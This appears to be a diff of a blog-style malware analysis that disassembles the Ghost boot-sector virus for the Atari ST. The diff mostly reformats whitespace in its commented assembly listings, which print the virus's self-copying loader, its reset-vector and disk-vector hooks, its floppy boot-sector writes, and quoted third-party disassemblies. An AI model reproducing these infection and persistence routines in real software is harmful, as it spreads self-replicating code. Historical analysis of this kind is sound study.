@@ -95,28 +95,28 @@ Let's see the details:
 ; Loader
 ; ----------------------------------------------------------------------------------------------------------
 LOADER:
-            MOVE.L    #$D6,D3 				            ; D3 = 214
-            LEA       RAM_ADDR.W,A1 		            ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
-            LEA       LOADER(PC),A2			            ; A2 @ LOADER
-            MOVE.L    (A2),D2 				            ; STOP IF L001 IS IN 0x140
+            MOVE.L    #$D6,D3                           ; D3 = 214
+            LEA       RAM_ADDR.W,A1                     ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
+            LEA       LOADER(PC),A2                     ; A2 @ LOADER
+            MOVE.L    (A2),D2                           ; STOP IF L001 IS IN 0x140
             CMP.L     (A1),D2
             BEQ       LOADER_END
-            MOVE.L    #RESVEC_MAGIC,D0 		            ; ELSE D0 = 0x31415926
-            CLR.L     D1					            ; D1 - 0
-            CMP.L     RESVEC_ENA.W,D0 			        ; IF @ 0x426 != 0x31415926 = >If this location contains the magic number $31415926
+            MOVE.L    #RESVEC_MAGIC,D0                  ; ELSE D0 = 0x31415926
+            CLR.L     D1                                ; D1 - 0
+            CMP.L     RESVEC_ENA.W,D0                   ; IF @ 0x426 != 0x31415926 = >If this location contains the magic number $31415926
                                                         ; then the system will jump through resvector (42A) on a system reset
-            BNE       PASS_RESVEC 			            ; GOTO PASS_RESVEC
-            MOVE.L    RESVEC.W,D1 				        ; ELSE D1 = 0x42A
+            BNE       PASS_RESVEC                       ; GOTO PASS_RESVEC
+            MOVE.L    RESVEC.W,D1                       ; ELSE D1 = 0x42A
 PASS_RESVEC:
             LEA       ORIGINAL_RESET_VECTOR(PC),A0      ; A0 = payload start address (ORIGINAL_RESET_VECTOR)
-            MOVE.L    D1,(A0) 				            ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
-            MOVE.L    #RESET_VECTOR_ADDR,D2				; set relocated RESET_VECTOR address in D2 to be the reset vector address
-            MOVE.L    D2,RESVEC.W 				        ; resvector: If the magic number in resvalid is set properly, this vector will be
+            MOVE.L    D1,(A0)                           ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
+            MOVE.L    #RESET_VECTOR_ADDR,D2             ; set relocated RESET_VECTOR address in D2 to be the reset vector address
+            MOVE.L    D2,RESVEC.W                       ; resvector: If the magic number in resvalid is set properly, this vector will be
                                                         ; jumped through on a system reset with the return address placed in A6.
-            MOVE.L    D0,RESVEC_ENA.W 		            ; set magic value
+            MOVE.L    D0,RESVEC_ENA.W                   ; set magic value
 COPY_LOADER:
-            MOVE.W    (A2)+,(A1)+ 			            ; FOR i = 214 TO 0 (214 words so 428 bytes)
-            DBF       D3,COPY_LOADER		            ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
+            MOVE.W    (A2)+,(A1)+                       ; FOR i = 214 TO 0 (214 words so 428 bytes)
+            DBF       D3,COPY_LOADER                    ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
             MOVE.L    #COUNTER_DEFAULT,COUNTER_ADDR.W   ; reset counter to -10
             BSR.S     INSTALL_HDV_HPB
 LOADER_END: RTS
@@ -152,7 +152,7 @@ INSTALL_HDV_HPB:
             ADDQ.B    #1,4+DEBUG_ADDR.W
             endc
             MOVE.L    #RESVEC_MAGIC,RESVEC_ENA.W        ; set magic value
-            MOVE.L    HDV_BPB.W,D0 				        ; hdv_bpb: This vector is used when Getbpb() is called.
+            MOVE.L    HDV_BPB.W,D0                      ; hdv_bpb: This vector is used when Getbpb() is called.
                                                         ; A value of 0 indicates that no hard disk is attached.
                                                         ; Applications installing themselves here should expect
                                                         ; parameters to be located on the stack as they would be
@@ -230,7 +230,7 @@ HDV_HPB_VECTOR:
             MOVEA.L   (A5),A5                           ;
             MOVEA.L   A5,A6                             ;
             MOVE.L    A5,-(sp)                          ; buf = (BOOTSECT_BUF)
-            MOVE.W    #FLOPRD,-(sp) 	                ; FLOPRD
+            MOVE.W    #FLOPRD,-(sp)                     ; FLOPRD
             TRAP      #XBIOS
             ADDA.L    #$14,sp                           ; fix stack
             TST.W     D0                                ; 0 = success
@@ -257,7 +257,7 @@ CALC_BOOT_CHK:
             MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
             CLR.L     -(sp)                             ; rsrvd = 0
             MOVE.L    A6,-(sp)                          ; buf = (BOOTSECT_BUF)
-            MOVE.W    #FLOPWR,-(sp) 	                ; FLOPWR
+            MOVE.W    #FLOPWR,-(sp)                     ; FLOPWR
             TRAP      #XBIOS
             ADDA.L    #$14,sp                           ; fix stack
             TST.W     D0                                ; success if 0
@@ -267,7 +267,7 @@ CALC_BOOT_CHK:
                                                         ; then reset to 0 so 5 to 5)
             BNE       HDV_HPB_VECTOR_END
             CLR.L     COUNTER_ADDR.W                    ; else set mousevec
-            MOVE.W    #KBDVBASE,-(sp) 	                ; Kbdvbase() returns a pointer to a system structure containing
+            MOVE.W    #KBDVBASE,-(sp)                   ; Kbdvbase() returns a pointer to a system structure containing
                                                         ; a ‘jump’ table to system vector handlers.
             TRAP      #XBIOS
             ADDQ.L    #2,sp                             ; fix stack, midivec, vkbderr, vmiderr , statvec, mousevec, clockvec, joyvec pointers struct in set in D0
@@ -330,7 +330,7 @@ The Reset Vector, installed by the `LOADER`, will use an undocumented TOS featur
 ; Reset vector flag and routine
 ; ----------------------------------------------------------------------------------------------------------
 ORIGINAL_RESET_VECTOR:
-            DCB.W     2,0 					            ; $190: resvector address will be written here
+            DCB.W     2,0                               ; $190: resvector address will be written here
 
 ; Concerning cold and warm reset. For every virus coder it is very important to know what's going on at reset
 ; sequence  esspecially concerning memory locations and system; vectors.
@@ -340,7 +340,7 @@ ORIGINAL_RESET_VECTOR:
 ; Note, as said, that if this code is the zeroed range, it will be exectuted THEN erased.
 
 RESET_VECTOR:                                           ; $194
-            MOVEA.L   PHYSTOP.W,A1 				        ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
+            MOVEA.L   PHYSTOP.W,A1                      ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
                                                         ; ghost looks to install itself at a required $200 boundary page
                                                         ; at page 40 ($8000) - 1 ($200)
             SUBA.L    #RESET_VECTOR_PAGE,A1
@@ -441,37 +441,37 @@ You can download the full commented (and tested identical to the original virus 
 In the source code of one of my preferred demo, Mindbomb from The Lost Boys, there are 2 [commented disassemblies](https://github.com/ggnkua/Atari_ST_Sources/tree/master/ASM/The%20Lost%20Boys%20(TLB)/Mindbomb/Vector) of the Ghost virus in the same folder as the reset demo screen (Vector) so maybe written by Mainikin? I was pleased to see that he was not able to undertand some parts of the virus that took me some time to figure out, especially the mouse inversion part which causes most disassemblers to misinterpret the XBIOS call:
 
 ```asm
-    CLR.L	(A0)			WAIT FOR 5 MORE TIMES
-    MOVE.W	#$22,-(A7)		GET ADDRESS OF MOUSE VEC
-    TRAP	#14
-    ADDQ.L	#2,A7
-    ADD.L	#$10,D0			NOT SURE HOW IT MAKES MOUSE GO!
-    EXG	D0,A0
-    MOVE.L	(A0),-(A7)
-    PEA	L2110A(PC)
-    MOVE.L	#1,-(A7)       <========
-    TRAP	#14
-    ADDA.L	#$C,A7
-    LEA 	SHIT(PC),A0
-    EORI.B	#1,$(A0)
+    CLR.L    (A0)               WAIT FOR 5 MORE TIMES
+    MOVE.W    #$22,-(A7)        GET ADDRESS OF MOUSE VEC
+    TRAP    #14
+    ADDQ.L    #2,A7
+    ADD.L    #$10,D0            NOT SURE HOW IT MAKES MOUSE GO!
+    EXG    D0,A0
+    MOVE.L    (A0),-(A7)
+    PEA    L2110A(PC)
+    MOVE.L    #1,-(A7)          <========
+    TRAP    #14
+    ADDA.L    #$C,A7
+    LEA     SHIT(PC),A0
+    EORI.B    #1,$(A0)
 ```
 
-As `MOVE.L	#1,-(A7)` should not be considered as a call to `ssbrk()` (opcode 1) but `initmouse()` (opcode 0). 
+As `MOVE.L    #1,-(A7)` should not be considered as a call to `ssbrk()` (opcode 1) but `initmouse()` (opcode 0). 
 And no comment about the undocumented TOS feature, I guess few people were aware.
 
 Another English demoscener tried to also to [do the job](https://github.com/ggnkua/Atari_ST_Sources/blob/master/ASM/The%20Cenobytes/fink/B_SECTOR/GHOST_V.S) (I must admit I don't know him), The Fink from The Cenobytes but without better success:
 
 ```asm
-    ADD.L	#$10,D0		GET ORIGIN FOR Y-AXIS IS UP
-    EXG	A0,D0		    EXCHANGE REGISTERS A0 WITH D0 
-                        (FUCK THE MOUSE UP!!!!!!)
-    MOVE.L	(A0),-(A7)
-    PEA	$1C4(PC)	    RESERVE 452 BYTES AT UPPER END OF MEMORY
-    MOVE.L	#1,-(A7)
-    TRAP	#14		    SAVE MEMORY SPACE
-    ADDA.L	#$C,A7
+    ADD.L    #$10,D0        GET ORIGIN FOR Y-AXIS IS UP
+    EXG    A0,D0            EXCHANGE REGISTERS A0 WITH D0 
+                            (FUCK THE MOUSE UP!!!!!!)
+    MOVE.L    (A0),-(A7)
+    PEA    $1C4(PC)         RESERVE 452 BYTES AT UPPER END OF MEMORY
+    MOVE.L    #1,-(A7)
+    TRAP    #14             SAVE MEMORY SPACE
+    ADDA.L    #$C,A7
     
-    EORI.B	#1,$2E6.W
+    EORI.B    #1,$2E6.W
 ```
 
 ### System calls (From the Atari Compendium)
